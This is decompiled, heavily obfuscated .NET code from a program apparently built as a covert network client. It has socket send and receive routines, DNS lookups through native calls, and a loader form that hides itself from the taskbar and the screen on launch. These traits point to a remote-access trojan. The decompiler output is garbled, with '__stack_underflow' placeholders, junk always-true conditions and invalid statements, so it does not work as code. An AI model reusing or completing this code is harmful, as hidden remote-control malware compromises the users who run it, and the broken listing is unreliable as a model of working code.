            if (this.#=qOgcjmweVxeuvMU4cvcFOmg== == 4)
            {
                local2 = System.BitConverter.ToInt32(this.#=qN$clRL1tbKGnARF7__FwJg==, 0);
                if (local2 <= this.#=qcyVktfYxc51I1XopnwGNjQ==)
                {
                    if (local2 > 0)
                    {
                        this.#=qOsu3u3mLIa8ikCCuCoOv_w== = 0;
                        this.#=qOgcjmweVxeuvMU4cvcFOmg== = 0;
                        this.#=qgBCfMYp3J4fCYU13EId5uw== = true;
                        System.Array.Resize(ref this.#=qP5B75c4g32E_HsewCKc$Ig==, local2);
                        if (arg2 < arg3)
                        {
                            this.#=qdiuHngY4wejUsgFY5u7CtQ==(arg1, arg2, arg3);
                        }
                    }
                    else
                    {
                        local4 = this.#=qe9p_PgOCiouYWahOSDKth00dr9CdsTb1R3DYgCeLUBw=;
                        if (local4 != null)
                        {
                            local4.Invoke(this, new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960727)));
                        }
                        this.#=quOBOxPeAl_kjKKx$REI6dA==();
                        return;
                    }
                }
                else
                {
                    local4 = this.#=qe9p_PgOCiouYWahOSDKth00dr9CdsTb1R3DYgCeLUBw=;
                    if (local4 != null)
                    {
                        local4.Invoke(this, new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960268)));
                    }
                    this.#=quOBOxPeAl_kjKKx$REI6dA==();
                    return;
                }
            }
        }
        else
        {
            if (3 != 0)
            {
                local0 = __stack_underflow;
            }
            System.Buffer.BlockCopy(arg1, arg2, this.#=qP5B75c4g32E_HsewCKc$Ig==, this.#=qOsu3u3mLIa8ikCCuCoOv_w==, local0);
            if (3 != 0)
            {
                __stack_underflow.#=qOsu3u3mLIa8ikCCuCoOv_w== = __stack_underflow;
            }
            if (this.#=qOsu3u3mLIa8ikCCuCoOv_w== == checked((int)this.#=qP5B75c4g32E_HsewCKc$Ig==.Length))
            {
                if (1 != 0)
                {
                    local3 = __stack_underflow;
                }
                if (local3 != null)
                {
                    local3.Invoke(this, this.#=qP5B75c4g32E_HsewCKc$Ig==);
                }
                if (4 != 0)
                {
                    __stack_underflow.#=qgBCfMYp3J4fCYU13EId5uw== = __stack_underflow;
                }
                System.Array.Resize(ref this.#=qP5B75c4g32E_HsewCKc$Ig==, 0);
                if (this.#=qOsu3u3mLIa8ikCCuCoOv_w== >= this.#=qe99VPFgyNENK$KtARK_iPuwvOEw_NRgC00PdG55dmGA=)
                {
                    System.GC.Collect();
                }
            }
            if (local0 < (arg3 - arg2))
            {
                this.#=qdiuHngY4wejUsgFY5u7CtQ==(arg1, arg2 + local0, arg3);
            }
        }
    }
    return;
}
// Client
public void #=qZRkZQGrnZUWoFBVE_TP$5Q==(byte[] arg1)
{
    System.Exception local0;
    object local1;
    #=qRHdMxv5xMrip5nI3eHU3Y52nJ9DhG_ImQVoJh$ooupk= local2;

    if (!(this.#=qGqugi8s64S3wxXEod1SSyA==))
    {
        return;
    }
    try
    {
        if (3 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// Client
private void #=q7uQjJN4fKJgs403tXnERFbQ1VWp3FBsMW_1ZAWZtc1g=()
{
    int local0;
    int local1;
    object local2;

    if (this.#=qDJ0VTVPWfAWYghKX_DdnsQ== == checked((int)this.#=q9LcncGbDdZaeonfU3943IQ==.Length))
    {
        if (8 != 0)
        {
            __stack_underflow.#=qDJ0VTVPWfAWYghKX_DdnsQ== = __stack_underflow;
        }
        if (3 != 0)
        {
            local2 = __stack_underflow;
        }
        Microsoft.VisualBasic.CompilerServices.ObjectFlowControl.CheckForSyncLockOnValueType(local2);
        System.Threading.Monitor.Enter(local2);
        try
        {
            if (0 == 0)
            {
                __stack_underflow.#=q9LcncGbDdZaeonfU3943IQ== = __stack_underflow;
            }
        }
        finally
        {
        }
    }
    if (!(!this.#=qABNlGFDc7nOg_C39swAcLA== || this.#=qDJ0VTVPWfAWYghKX_DdnsQ== != 0))
    {
        local0 = 4;
        System.Buffer.BlockCopy(System.BitConverter.GetBytes(checked((int)this.#=q9LcncGbDdZaeonfU3943IQ==.Length)), 0, this.#=q5C_es0qgtlVCNxzfPQ_idg==, this.#=q8T1neNU8Flp1WaNsBKnRHQ==.Offset, 4);
    }
    local1 = System.Math.Min(checked((int)this.#=q9LcncGbDdZaeonfU3943IQ==.Length) - this.#=qDJ0VTVPWfAWYghKX_DdnsQ==, this.#=qiCTCgJQkyH_Kzq$FT43G4Q== - local0);
    System.Buffer.BlockCopy(this.#=q9LcncGbDdZaeonfU3943IQ==, this.#=qDJ0VTVPWfAWYghKX_DdnsQ==, this.#=q5C_es0qgtlVCNxzfPQ_idg==, this.#=q8T1neNU8Flp1WaNsBKnRHQ==.Offset + local0, local1);
    this.#=q8T1neNU8Flp1WaNsBKnRHQ==.SetBuffer(this.#=q8T1neNU8Flp1WaNsBKnRHQ==.Offset, local1 + local0);
    if (!(this.#=qc3tkHe_7v$eGA2x6krh72Q==.SendAsync(this.#=q8T1neNU8Flp1WaNsBKnRHQ==)))
    {
        this.#=quebj1wBCmruzAKmg6Y4Igg==(this.#=qc3tkHe_7v$eGA2x6krh72Q==, this.#=q8T1neNU8Flp1WaNsBKnRHQ==);
    }
    return;
}
// Client
public void #=quOBOxPeAl_kjKKx$REI6dA==()
{
    bool local0;
    bool local1;
    #=qKqE6jaRKu5jJvHl8RwywXQDv4h_f2ISEaHK__Drdd$M= local2;
    #=qdy_NHDvN7XTcQtWWMYxYKbuJqtXHsYJXM_YUEvVR0bc= local3;

    if (!(this.#=qHiBdWLOLLVg67b8lN8FRqgmYNWZfcDieu2MH9_zIY6Q=()))
    {
        return;
    }
    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    if (-1 != 0)
    {
        __stack_underflow.#=qGqugi8s64S3wxXEod1SSyA== = __stack_underflow;
    }
    this.#=qhiSO75CpxncaWptyc0vAMQ== = false;
    if (this.#=qc3tkHe_7v$eGA2x6krh72Q== != null)
    {
        this.#=qc3tkHe_7v$eGA2x6krh72Q==.Close();
        this.#=qc3tkHe_7v$eGA2x6krh72Q== = null;
    }
    if (this.#=qos7yzAcb5jR$ypc0Qk3OWQ== != null)
    {
        this.#=qos7yzAcb5jR$ypc0Qk3OWQ==.Dispose();
        this.#=qos7yzAcb5jR$ypc0Qk3OWQ== = null;
    }
    if (this.#=q8T1neNU8Flp1WaNsBKnRHQ== != null)
    {
        this.#=q8T1neNU8Flp1WaNsBKnRHQ==.Dispose();
        this.#=q8T1neNU8Flp1WaNsBKnRHQ== = null;
    }
    if (this.#=qo8wG17V6QHcxsU4R0xmY_Q== != null)
    {
        this.#=qo8wG17V6QHcxsU4R0xmY_Q==.Dispose();
        this.#=qo8wG17V6QHcxsU4R0xmY_Q== = null;
    }
    if (this.#=q6uR3lWd6_aD2reKUDlx$OA== != null)
    {
        this.#=q6uR3lWd6_aD2reKUDlx$OA==.Clear();
        this.#=q6uR3lWd6_aD2reKUDlx$OA== = null;
    }
    this.#=qDJ0VTVPWfAWYghKX_DdnsQ== = 0;
    this.#=qOsu3u3mLIa8ikCCuCoOv_w== = 0;
    this.#=qN$clRL1tbKGnARF7__FwJg== = null;
    this.#=qP5B75c4g32E_HsewCKc$Ig== = null;
    this.#=q9LcncGbDdZaeonfU3943IQ== = null;
    this.#=q5C_es0qgtlVCNxzfPQ_idg== = null;
    this.#=qgBCfMYp3J4fCYU13EId5uw== = false;
    this.#=qMoRe_p4fasg7BcMJcnicWw== = false;
    if (!local0)
    {
        if (!(!local1))
        {
            local3 = this.#=q2dXdGRU_h62YVIUhgXBQJzEnralpXNvp017RQs19jjo=;
            if (local3 != null)
            {
                local3.Invoke(this);
            }
        }
    }
    else
    {
        local2 = this.#=q3C4Iol1nMl5AFLWNdE6nxB2_kG0uXzx35vvsn$gQzt8=;
        if (local2 != null)
        {
            local2.Invoke(this, false);
        }
    }
    return;
}
// Client
private System.Net.IPAddress[] #=qzAgp3UwWT0075L6Sh4PfZA==(string arg1, System.Net.IPAddress arg2)
{
    System.Collections.Generic.List<System.Net.IPAddress> local0;
    #=qsAejPkl5V6B3npq6homyUA== local2;
    nint local3;
    System.Net.IPAddress local4;
    DnsRecord local5;
    nint local6;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    if (1 != 0)
    {
        local6 = __stack_underflow;
    }
    if (Client.#=qscQJIcBkI9VH8bZTZtABeA==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, out local6) == 0)
    {
        local5 = *System.Runtime.InteropServices.Marshal.PtrToStructure(local3, typeof(DnsRecord));
        local4 = this.#=q8xbuK7pqyq7mWB67vviBtOo1WSCccuR7xEQnGnyxMyQ=(local5);
        if (local4 != None)
        {
            local0.Add(local4);
        }
        while (!((&local5).#=qCeJ_QwVb__fbuEImkTXwSg== == Zero))
        {
            local5 = *System.Runtime.InteropServices.Marshal.PtrToStructure((&local5).#=qCeJ_QwVb__fbuEImkTXwSg==, typeof(DnsRecord));
            local4 = this.#=q8xbuK7pqyq7mWB67vviBtOo1WSCccuR7xEQnGnyxMyQ=(local5);
            if (local4 != None)
            {
                local0.Add(local4);
                continue;
            }
        }
    }
    return local0.ToArray();
}
// Client
private #=qsAejPkl5V6B3npq6homyUA== #=q_$06eDx4N3eSJzkchUhbnjKtHnRsckM7I4ZqcwfQO8E=(System.Net.IPAddress arg1)
{
    #=qsAejPkl5V6B3npq6homyUA== local1;
    #=qsAejPkl5V6B3npq6homyUA== local2;
    uint[] local3;

    if (arg1 == null)
    {
        return local2;
    }
    local1 = default(#=qsAejPkl5V6B3npq6homyUA==);
    if (1 != 0)
    {
        __stack_underflow.#=qVXB_y3eN_sp1$Md9UoJeYQ== = __stack_underflow;
    }
    if (-1 != 0)
    {
        local3 = __stack_underflow;
    }
    local3[0] = System.BitConverter.ToUInt32(arg1.GetAddressBytes(), 0);
    if (2 != 0)
    {
        __stack_underflow.#=q37jfceDpvm0BhKQMkpktNw== = __stack_underflow;
    }
    return local1;
}
// Client
private System.Net.IPAddress #=q8xbuK7pqyq7mWB67vviBtOo1WSCccuR7xEQnGnyxMyQ=(DnsRecord arg1)
{
    if ((&arg1).#=qFWLbBQgFiIpy22HFbhF9GQ== != 1)
    {
        return None;
    }
    if (((&arg1).#=q6uKQziMZIL8_PaX2KpbPTA== & 3) >= 2)
    {
        return None;
    }
    return new System.Net.IPAddress((ulong)(&arg1).#=qeADSRAqxC2FlJbA5Uc5$2A==);
}
// Client
private void _Lambda$__7(object arg1)
{
    ((1 != 0 ? this : this))._Lambda$__8.Invoke();
    return;
}
// Client
private void _Lambda$__8()
{
    ((7 != 0 ? this : this)).#=qA4f0kKyGXTRnU4z03oji_RIPyVnvoC_BRjpESDLHXqY=(((7 != 0 ? this : this)).#=qfHad4tglpNfnMqZ6nFkPPA==, ((6 != 0 ? this : this)).#=qU_UZ3uhfwWgI9uBw5HT3xA==);
    return;
}
// #=q8McCIarwH$XScVz0xkTmJw==
public void .ctor()
{
    ((0 == 0 ? this : this)).ctor();
    return;
}
// #=q8McCIarwH$XScVz0xkTmJw==
public void _Lambda$__10()
{
    ((0 == 0 ? this : this)).#=qd5f1i4cDO3tAO_bEb7g1cw==.#=qFikK0kKzvE4fvbzxpsrllMMR8oLIJtNPAGP1lZZ4prs=(((2 != 0 ? this : this)).#=q5$hUSQAZNmEXcUcvGVFJrlqtw6IWJBy6C7LN$kOmTWU=);
    return;
}
// #=q8McCIarwH$XScVz0xkTmJw==
public void _Lambda$__9(object arg1)
{
    ((2 != 0 ? this : this))._Lambda$__10.Invoke();
    return;
}
// ClientLoaderForm
public void .ctor()
{
    this.add_FormClosing(this.#=qzDzg9a$HVGG1G5cdhqbdwO3OG_SFijGXN8Towa37$TQ=);
    this.add_Shown(this.#=qD4n8L4W9wQXrF7w_31K9bjmy3jeB41mSJJrYkh6lpiE=);
    System.Windows.Forms.Application.EnableVisualStyles();
    if (3 != 0)
    {
        #=qk77uxMCXAcR_2KMKgZiSng== = __stack_underflow;
    }
    this.ShowInTaskbar = false;
    this.WindowState = (System.Windows.Forms.FormWindowState)1;
    return;
}
// ClientLoaderForm
public static void Main()
{
    System.Windows.Forms.Application.Run(#=qqROT7DfncW7strhZvp0iRQ==().#=qbzig1$2CwLluEJt5uPtpgqPx5y_2S$GoPgJP36N8bTE=());
    return;
}
// ClientLoaderForm
private void #=qzDzg9a$HVGG1G5cdhqbdwO3OG_SFijGXN8Towa37$TQ=(object arg1, System.Windows.Forms.FormClosingEventArgs arg2)
{
    #=qXkgpfghvTKDZGlXBGI4x9veQO4JfjF7GW2ECw9$L3EvyKZGOnziwXE2Xr1EkpRwe(false);
    if (#=qmbdg4P9$2ouafwS8nEs4lA== != null)
    {
        #=q9rN$wEdl9rzJbAMMIiemCg==();
    }
    return;
}
// ClientLoaderForm
private void #=qD4n8L4W9wQXrF7w_31K9bjmy3jeB41mSJJrYkh6lpiE=(object arg1, System.EventArgs arg2)
{
    ((0 == 0 ? this : this)).Visible = false;
    #=qf3c4WtE$$thN5QyBMvo3u0lth2VF5hmfUsIv1r8yRkg=();
    return;
}
